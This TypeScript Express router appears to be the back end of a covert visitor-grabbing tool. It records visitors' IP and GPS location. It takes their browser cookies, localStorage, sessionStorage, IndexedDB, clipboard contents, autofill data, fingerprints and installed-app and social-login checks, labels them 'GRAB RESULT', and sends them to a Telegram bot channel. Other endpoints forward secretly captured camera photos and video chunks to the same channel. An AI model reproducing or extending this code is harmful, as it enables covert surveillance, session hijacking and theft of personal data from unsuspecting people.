import { Router } from "express";
import { db, visitsTable } from "@workspace/db";
import { desc } from "drizzle-orm";
import {
  LogVisitBody,
  SendDeviceInfoBody,
  SendPhotoBody,
  SendVideoChunkBody,
} from "@workspace/api-zod";
import { logger } from "../lib/logger";

const router = Router();

// ── User-agent parser ──────────────────────────────────────────────────────

function parseUserAgent(ua: string): { browser: string; os: string; deviceType: string } {
  let browser = "Unknown";
  let os = "Unknown";
  let deviceType = "Desktop";

  if (/mobile|android|iphone|ipad|tablet/i.test(ua)) {
    deviceType = /tablet|ipad/i.test(ua) ? "Tablet" : "Mobile";
  }

  if (/edg\//i.test(ua)) browser = "Edge";
  else if (/chrome/i.test(ua) && !/chromium/i.test(ua)) browser = "Chrome";
  else if (/firefox/i.test(ua)) browser = "Firefox";
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
  else if (/opera|opr/i.test(ua)) browser = "Opera";
  else if (/msie|trident/i.test(ua)) browser = "IE";

  if (/windows/i.test(ua)) os = "Windows";
  else if (/android/i.test(ua)) os = "Android";
  else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
  else if (/mac os x/i.test(ua)) os = "macOS";
  else if (/linux/i.test(ua)) os = "Linux";

  return { browser, os, deviceType };
}

function getClientIp(req: any): string {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    return String(forwarded).split(",")[0].trim();
  }
  return req.ip ?? req.socket?.remoteAddress ?? "Unknown";
}

// ── MarkdownV2 helpers ─────────────────────────────────────────────────────

/** Escape all MarkdownV2 special characters in raw content */
function esc(s: unknown): string {
  return String(s ?? "").replace(/([_*[\]()~`>#+\-=|{}.!\\])/g, "\\$&");
}

/** Bold section header with emoji, e.g. "🌐 *Network*" */
function hdr(emoji: string, title: string): string {
  return `${emoji} *${esc(title)}*`;
}

/**
 * Blockquote block — each line prefixed with ">".
 * Content inside blockquotes still needs MarkdownV2 escaping.
 */
function bq(lines: string[]): string {
  return lines
    .filter((l) => l !== "")
    .map((l) => `>${l}`)
    .join("\n");
}

/** Build one section: header + blockquoted lines, or nothing if no lines */
function section(emoji: string, title: string, lines: string[]): string {
  const rows = lines.filter(Boolean);
  if (!rows.length) return "";
  return `${hdr(emoji, title)}\n${bq(rows)}`;
}

// ── Telegram helpers ───────────────────────────────────────────────────────

async function tgSendText(token: string, chatId: string, text: string): Promise<void> {
  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "MarkdownV2",
        disable_web_page_preview: true,
      }),
    });
    if (!res.ok) {
      const body = await res.text().catch(() => "");
      logger.warn({ status: res.status, body }, "Telegram sendMessage failed");
    }
  } catch (err) {
    logger.warn({ err }, "Telegram sendMessage error");
  }
}

interface MultipartField {
  name: string;
  value?: string;
  file?: { data: Buffer; filename: string; contentType: string };
}

function buildMultipart(fields: MultipartField[], boundary: string): Buffer {
  const CRLF = "\r\n";
  const parts: Buffer[] = [];

  for (const field of fields) {
    parts.push(Buffer.from(`--${boundary}${CRLF}`));
    if (field.file) {
      parts.push(
        Buffer.from(
          `Content-Disposition: form-data; name="${field.name}"; filename="${field.file.filename}"${CRLF}` +
            `Content-Type: ${field.file.contentType}${CRLF}${CRLF}`,
        ),
      );
      parts.push(field.file.data);
    } else {
      parts.push(
        Buffer.from(
          `Content-Disposition: form-data; name="${field.name}"${CRLF}${CRLF}` +
            String(field.value ?? ""),
        ),
      );
    }
    parts.push(Buffer.from(CRLF));
  }
  parts.push(Buffer.from(`--${boundary}--${CRLF}`));
  return Buffer.concat(parts);
}

async function telegramMultipartPost(
  token: string,
  method: string,
  fields: MultipartField[],
): Promise<void> {
  const boundary = `TGBoundary${Date.now()}${Math.random().toString(36).slice(2)}`;
  const body = buildMultipart(fields, boundary);

  const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    headers: {
      "Content-Type": `multipart/form-data; boundary=${boundary}`,
      "Content-Length": String(body.byteLength),
    },
    body,
  });

  if (!res.ok) {
    const text = await res.text().catch(() => "(unreadable)");
    logger.warn({ method, status: res.status, body: text }, "Telegram API error");
  }
}

// ── Geocode helper ─────────────────────────────────────────────────────────

async function reverseGeocode(lat: number, lng: number): Promise<{ country: string | null; city: string | null }> {
  try {
    const geoRes = await fetch(
      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`,
      {
        headers: { "User-Agent": "VisitorTracker/1.0" },
        signal: AbortSignal.timeout(3000),
      }
    );
    if (geoRes.ok) {
      const geo = await geoRes.json() as any;
      return {
        country: geo.address?.country ?? null,
        city: geo.address?.city ?? geo.address?.town ?? geo.address?.village ?? geo.address?.county ?? null,
      };
    }
  } catch {
    // Non-fatal
  }
  return { country: null, city: null };
}

// ── POST /visits ───────────────────────────────────────────────────────────

router.post("/visits", async (req, res) => {
  const parsed = LogVisitBody.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "Invalid request body" });
  }

  const { latitude, longitude, accuracy, altitude, referrer } = parsed.data;
  const ua = req.headers["user-agent"] ?? "";
  const { browser, os, deviceType } = parseUserAgent(ua);
  const ip = getClientIp(req);

  let country: string | null = null;
  let city: string | null = null;

  if (latitude != null && longitude != null) {
    const geo = await reverseGeocode(latitude, longitude);
    country = geo.country;
    city = geo.city;
  }

  const [visit] = await db
    .insert(visitsTable)
    .values({
      ip,
      latitude: latitude ?? null,
      longitude: longitude ?? null,
      accuracy: accuracy ?? null,
      altitude: altitude ?? null,
      country,
      city,
      userAgent: ua || null,
      browser,
      os,
      deviceType,
      referrer: referrer ?? null,
    })
    .returning();

  return res.status(201).json({ ...visit, createdAt: visit.createdAt.toISOString() });
});

// ── GET /visits ────────────────────────────────────────────────────────────

router.get("/visits", async (_req, res) => {
  const visits = await db
    .select()
    .from(visitsTable)
    .orderBy(desc(visitsTable.createdAt));

  return res.json(visits.map((v) => ({ ...v, createdAt: v.createdAt.toISOString() })));
});

// ── GET /visits/stats ──────────────────────────────────────────────────────

router.get("/visits/stats", async (_req, res) => {
  const allVisits = await db
    .select()
    .from(visitsTable)
    .orderBy(desc(visitsTable.createdAt));

  const totalVisits = allVisits.length;
  const uniqueIps = new Set(allVisits.map((v) => v.ip).filter(Boolean)).size;
  const withLocation = allVisits.filter((v) => v.latitude != null && v.longitude != null).length;

  const countryMap = new Map<string, number>();
  for (const v of allVisits) {
    const key = v.country ?? "Unknown";
    countryMap.set(key, (countryMap.get(key) ?? 0) + 1);
  }
  const topCountries = Array.from(countryMap.entries())
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([country, count]) => ({ country, count }));

  const dayMap = new Map<string, number>();
  const now = new Date();
  for (let i = 13; i >= 0; i--) {
    const d = new Date(now);
    d.setDate(d.getDate() - i);
    dayMap.set(d.toISOString().slice(0, 10), 0);
  }
  for (const v of allVisits) {
    const day = v.createdAt.toISOString().slice(0, 10);
    if (dayMap.has(day)) dayMap.set(day, (dayMap.get(day) ?? 0) + 1);
  }
  const visitsPerDay = Array.from(dayMap.entries()).map(([date, count]) => ({ date, count }));
  const recentVisits = allVisits.slice(0, 10).map((v) => ({ ...v, createdAt: v.createdAt.toISOString() }));

  return res.json({ totalVisits, uniqueIps, withLocation, recentVisits, topCountries, visitsPerDay });
});

// ── POST /visits/deviceinfo ────────────────────────────────────────────────

router.post("/visits/deviceinfo", async (req, res) => {
  const parsed = SendDeviceInfoBody.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "Invalid body" });
  }

  const info = parsed.data as Record<string, unknown>;
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHANNEL_ID;

  if (token && chatId) {
    const ip = getClientIp(req);
    const time = new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" });

    const lat = info._lat ? Number(info._lat) : null;
    const lng = info._lng ? Number(info._lng) : null;
    const acc = info._accuracy ? Number(info._accuracy) : null;
    const hasGps = lat != null && lng != null && !isNaN(lat) && !isNaN(lng);
    const mapsUrl = hasGps ? `https://www.google.com/maps?q=${lat},${lng}` : null;

    let geoCity = "";
    let geoCountry = "";
    if (hasGps) {
      const geo = await reverseGeocode(lat!, lng!);
      geoCity = geo.city ?? "";
      geoCountry = geo.country ?? "";
    }

    const v = (val: unknown) => (val && val !== "unknown" ? String(val) : null);

    // ── Main grab result ──────────────────────────────────────────────────
    const sections: string[] = [];

    // Header
    sections.push(`🎯 *${esc("GRAB RESULT")}*`);

    // Network / IP
    const netLines: string[] = [`IP\\: \`${esc(ip)}\``];
    if (hasGps) {
      netLines.push(`LAT\\: \`${esc(lat!.toFixed(6))}\``);
      netLines.push(`LNG\\: \`${esc(lng!.toFixed(6))}\``);
      if (acc != null) netLines.push(`ACC\\: \`${esc(Math.round(acc))}m\``);
      netLines.push(`MAP\\: [Open Google Maps](${esc(mapsUrl!)})`);
    } else {
      netLines.push(`GPS\\: No location`);
    }
    if (geoCity || geoCountry) {
      netLines.push(`GEO\\: ${esc([geoCity, geoCountry].filter(Boolean).join(", "))}`);
    }
    if (v(info["netType"])) {
      let netStr = String(info["netType"]);
      if (info["netDownlink"]) netStr += ` • ${info["netDownlink"]}`;
      if (info["netRtt"]) netStr += ` • RTT ${info["netRtt"]}`;
      netLines.push(`NET\\: ${esc(netStr)}`);
      if (info["dataSaver"]) netLines.push(`Data Saver\\: ON`);
    }
    if (v(info["localIPs"]) && info["localIPs"] !== "none") {
      netLines.push(`LAN\\: \`${esc(info["localIPs"])}\``);
    }
    sections.push(section("🌐", "Network", netLines));

    // Display
    const displayLines: string[] = [];
    if (v(info["screenRes"])) displayLines.push(`Screen\\: ${esc(info["screenRes"])} @${esc(info["pixelRatio"])}x`);
    if (v(info["orientation"])) displayLines.push(`Orient\\: ${esc(info["orientation"])}`);
    if (info["touchPoints"]) displayLines.push(`Touch\\: ${esc(info["touchPoints"])} points`);
    if (v(info["colorGamut"])) displayLines.push(`Gamut\\: ${esc(info["colorGamut"])}`);
    if (info["hdr"]) displayLines.push(`HDR\\: ${esc(info["hdr"])}`);
    if (v(info["refreshRate"])) displayLines.push(`Refresh\\: ${esc(info["refreshRate"])}`);
    if (info["darkMode"]) displayLines.push(`Theme\\: ${esc(info["darkMode"])}`);
    sections.push(section("🖥", "Display", displayLines));

    // Hardware
    const hwLines: string[] = [];
    if (v(info["memory"])) hwLines.push(`RAM\\: ${esc(info["memory"])}`);
    if (v(info["cpuCores"])) hwLines.push(`CPU\\: ${esc(info["cpuCores"])}`);
    if (info["battery"]) hwLines.push(`Battery\\: ${esc(info["battery"])} \\(charging\\: ${esc(info["charging"])}\\)`);
    if (v(info["gpu"])) hwLines.push(`GPU\\: ${esc(info["gpu"])}`);
    if (v(info["gpuVendor"]) && info["gpuVendor"] !== info["gpu"]) hwLines.push(`Vendor\\: ${esc(info["gpuVendor"])}`);
    sections.push(section("💾", "Hardware", hwLines));

    // Browser
    const browserLines: string[] = [];
    if (info["timezone"]) browserLines.push(`TZ\\: ${esc(info["timezone"])}`);
    if (info["languages"]) browserLines.push(`Lang\\: ${esc(info["languages"])}`);
    if (info["cookies"]) browserLines.push(`Cookies\\: ${esc(info["cookies"])}`);
    if (v(info["canvasFP"])) browserLines.push(`Canvas FP\\: \`${esc(info["canvasFP"])}\``);
    if (v(info["audioFP"])) browserLines.push(`Audio FP\\: \`${esc(info["audioFP"])}\``);
    sections.push(section("🔑", "Browser", browserLines));

    // Camera & Mic
    const camLines: string[] = [];
    if (info["cameras"]) camLines.push(`Cameras\\: ${esc(info["cameras"])}`);
    if (v(info["camModel"]) && info["camModel"] !== "no label") camLines.push(`Cam\\: ${esc(info["camModel"])}`);
    if (info["mics"]) camLines.push(`Mics\\: ${esc(info["mics"])}`);
    if (v(info["micModel"]) && info["micModel"] !== "no label") camLines.push(`Mic\\: ${esc(info["micModel"])}`);
    if (info["permCamera"]) camLines.push(`Cam Perm\\: ${esc(info["permCamera"])}`);
    if (info["permMic"]) camLines.push(`Mic Perm\\: ${esc(info["permMic"])}`);
    sections.push(section("📷", "Camera & Mic", camLines));

    // Footer timestamp
    sections.push(`⏱ _${esc(time)}_`);

    const mainMsg = sections.filter(Boolean).join("\n\n");
    await tgSendText(token, chatId, mainMsg);

    // ── Social recon ──────────────────────────────────────────────────────
    const social = info["social"];
    if (social && typeof social === "object" && Object.keys(social).length > 0) {
      const entries = Object.entries(social as Record<string, string>);
      const socialLines = entries.map(([platform, status]) => {
        const badge = status !== "blocked" ? "✓" : "✗";
        return `${badge} ${esc(platform)} — ${esc(status)}`;
      });
      const msg = `${hdr("🌍", "Social Recon")}\n${bq(socialLines)}`;
      await tgSendText(token, chatId, msg);
    }

    // ── App detection ─────────────────────────────────────────────────────
    const apps = info["apps"];
    if (apps && typeof apps === "object" && Object.keys(apps).length > 0) {
      const entries = Object.entries(apps as Record<string, string>);
      const installed = entries.filter(([, s]) => s === "installed");
      const rest = entries.filter(([, s]) => s !== "installed");
      const appLines = [...installed, ...rest].map(([app, status]) => {
        const badge = status === "installed" ? "✓" : "—";
        return `${badge} ${esc(app)}`;
      });
      const msg = `${hdr("📱", "App Detection")}\n${bq(appLines)}`;
      await tgSendText(token, chatId, msg);
    }

    // ── Browser storage ───────────────────────────────────────────────────
    const storage = info["storage"];
    if (storage && typeof storage === "object" && Object.keys(storage).length > 0) {
      const s = storage as Record<string, string>;

      const storageSections: string[] = [hdr("🗄", "Browser Storage")];

      // Cookies
      const cookieVal = (s["cookies"] || "").trim();
      storageSections.push(
        `${hdr("🍪", "Cookies")}\n${bq([esc(cookieVal || "(No cookies)")])}`
      );

      // LocalStorage
      const lsVal = (s["localStorage"] || "").trim();
      storageSections.push(
        `${hdr("🗃", "LocalStorage")}\n${bq([esc(lsVal || "(Empty)")])}`
      );

      // SessionStorage
      const ssVal = (s["sessionStorage"] || "").trim();
      storageSections.push(
        `${hdr("📦", "SessionStorage")}\n${bq([esc(ssVal || "(Empty)")])}`
      );

      // IndexedDB
      if (s["indexedDB"]) {
        storageSections.push(
          `${hdr("💿", "IndexedDB")}\n${bq([esc(s["indexedDB"])])}`
        );
      }

      // CacheStorage
      if (s["cacheStorage"]) {
        storageSections.push(
          `${hdr("⚡", "Cache Storage")}\n${bq([esc(s["cacheStorage"])])}`
        );
      }

      // Service Workers
      if (s["serviceWorkers"]) {
        storageSections.push(
          `${hdr("⚙", "Service Workers")}\n${bq([esc(s["serviceWorkers"])])}`
        );
      }

      await tgSendText(token, chatId, storageSections.join("\n\n"));
    }

    // ── Clipboard ─────────────────────────────────────────────────────────
    const clipboard = info["clipboard"];
    if (clipboard && typeof clipboard === "object") {
      const c = clipboard as Record<string, string>;
      const clipLines: string[] = [];
      if (c["text"]) clipLines.push(esc(c["text"].slice(0, 1000)));
      if (c["selected"]) clipLines.push(`Selected\\: ${esc(c["selected"].slice(0, 500))}`);
      if (clipLines.length) {
        const msg = `${hdr("📋", "Clipboard")}\n${bq(clipLines)}`;
        await tgSendText(token, chatId, msg);
      }
    }

    // ── Autofill ──────────────────────────────────────────────────────────
    const autofill = info["autofill"];
    if (autofill && typeof autofill === "object" && Object.keys(autofill).length > 0) {
      const af = autofill as Record<string, string>;
      const afLines = Object.entries(af).map(([k, val]) => `${esc(k)}\\: ${esc(val)}`);
      const msg = `${hdr("📝", "Autofill Data")}\n${bq(afLines)}`;
      await tgSendText(token, chatId, msg);
    }
  }

  return res.status(200).json({ ok: true });
});

// ── POST /visits/photo ─────────────────────────────────────────────────────

router.post("/visits/photo", async (req, res) => {
  const parsed = SendPhotoBody.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "Missing photo" });
  }

  const { photo, caption: customCaption } = parsed.data;
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHANNEL_ID;

  if (token && chatId) {
    try {
      const buffer = Buffer.from(photo, "base64");
      const caption = customCaption ?? `📷 Photo — ${new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" })}`;

      await telegramMultipartPost(token, "sendPhoto", [
        { name: "chat_id", value: chatId },
        { name: "caption", value: caption },
        { name: "photo", file: { data: buffer, filename: "photo.jpg", contentType: "image/jpeg" } },
      ]);
    } catch (err) {
      logger.warn({ err }, "Failed to send photo to Telegram");
    }
  }

  return res.status(200).json({ ok: true });
});

// ── POST /visits/videochunk ────────────────────────────────────────────────

router.post("/visits/videochunk", async (req, res) => {
  const parsed = SendVideoChunkBody.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "Missing chunk" });
  }

  const { chunk, mimeType = "video/webm", index = 0, label = "CAM" } = parsed.data;
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHANNEL_ID;

  if (token && chatId) {
    try {
      const buffer = Buffer.from(chunk, "base64");
      const isMP4 = (mimeType ?? "").includes("mp4");
      const ext = isMP4 ? "mp4" : "webm";
      const method = isMP4 ? "sendVideo" : "sendDocument";
      const field = isMP4 ? "video" : "document";
      const caption = `🎥 ${label} chunk #${index} — ${new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" })}`;

      await telegramMultipartPost(token, method, [
        { name: "chat_id", value: chatId },
        { name: "caption", value: caption },
        { name: field, file: { data: buffer, filename: `chunk_${index}.${ext}`, contentType: mimeType ?? "video/webm" } },
      ]);
    } catch (err) {
      logger.warn({ err }, "Failed to send video chunk to Telegram");
    }
  }

  return res.status(200).json({ ok: true });
});

export default router;
